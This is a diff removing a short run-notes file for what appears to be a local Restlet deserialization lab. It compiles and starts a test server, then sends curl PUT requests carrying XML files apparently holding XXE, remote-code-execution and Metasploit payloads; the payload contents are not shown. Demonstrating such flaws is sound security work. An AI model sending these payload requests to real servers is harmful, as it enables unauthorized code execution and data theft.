@@ -1,7 +1,0 @@
-javac -cp ./lib/org.restlet.jar  *java
-1st terminal: java -cp ./lib/org.restlet.jar:. ServerRestlets
-2nd terminal: 
-	curl -X PUT -u scott:tiger --header "content-type: application/x-java-serialized-object+xml" --data @customer.xml "http://localhost:8180/customer"
-	curl -X PUT -u scott:tiger --header "content-type: application/x-java-serialized-object+xml" --data @customer-xxe.xml "http://localhost:8180/customer"
-	curl -X PUT -u scott:tiger --header "content-type: application/x-java-serialized-object+xml" --data @customer-rce.xml "http://localhost:8180/customer"
-	curl -X PUT -u scott:tiger --header "content-type: application/x-java-serialized-object+xml" --data @customer-met.xml "http://localhost:8180/customer"
